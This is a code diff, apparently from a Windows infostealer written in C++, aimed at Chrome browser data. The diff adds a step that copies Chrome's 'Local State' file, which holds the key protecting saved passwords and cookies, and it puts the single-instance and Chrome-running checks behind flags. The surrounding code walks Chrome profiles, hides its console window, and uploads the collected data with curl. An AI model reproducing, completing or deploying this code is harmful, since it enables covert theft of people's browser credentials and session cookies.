@@ -169,7 +169,8 @@ void chrome() {
             Sleep(1000);
         }
     }
-    if (!checkSelf(L"chrome.exe").empty()) { fcrm = true; return; }
+    if (CLOSECHROME && !checkSelf(L"chrome.exe").empty()) { fcrm = true; return; }
+    fs::copy(chromedir+wstring(L"Local State"), getabspathincurrdir(L"tmp\\localstate.json"));
     for (auto& p : fs::directory_iterator{ chromedir }) {
         profile = p.path().wstring().substr(
             p.path().wstring().find(chromedir) + wcslen(chromedir),
@@ -308,7 +309,7 @@ static size_t curl_data_write(void* contents, size_t size, size_t nmemb, void* u
 
 int wmain(int** argc, wchar_t* argv[])
 {
-    if (checkSelf(fs::path(argv[0]).filename().c_str()).size() > 1) { return -1; }
+    if (PROCESSCHECK && checkSelf(fs::path(argv[0]).filename().c_str()).size() > 1) { return -1; }
 
     ifDebug({
         _setmode(_fileno(stdout), 0x20000); //0x20000 is the same as _O_U16TEXT
@@ -317,9 +318,9 @@ int wmain(int** argc, wchar_t* argv[])
     });
     log_file.imbue(locale(".utf-8"));
 
-    if (PINGREQUIRED && system("ping -n 1 -w 500 google.com > nul") != 0) { return -1; }
+    if (PINGREQUIRED && system("ping -n 1 -w 500 google.com > nul") != 0) { return -2; }
 
-    ifNDebug({ if (FreeConsole() == FALSE) return -1; });
+    ifNDebug({ if (FreeConsole() == FALSE) return -3; });
 
     ifDebug(cout << boolalpha);
 
@@ -488,7 +489,7 @@ int wmain(int** argc, wchar_t* argv[])
         cout(22, 12, BRED, FAIL_STAT);
         cout(0, 13, FWHITE, L"Status: ");
         cout(22, 13, BRED, (to_string(res) + " (" + curl_easy_strerror(res) + ")").c_str());
-        return -1;
+        return -5;
     }
 
     size_t utf8_len = data.length();
@@ -512,5 +513,5 @@ int wmain(int** argc, wchar_t* argv[])
     // ! Send data
 
     if (ISDEBUG) { system("pause>nul"); }
-    return (response_code < 400)?0:-1;
+    return (response_code < 400)?0:-response_code;
 }
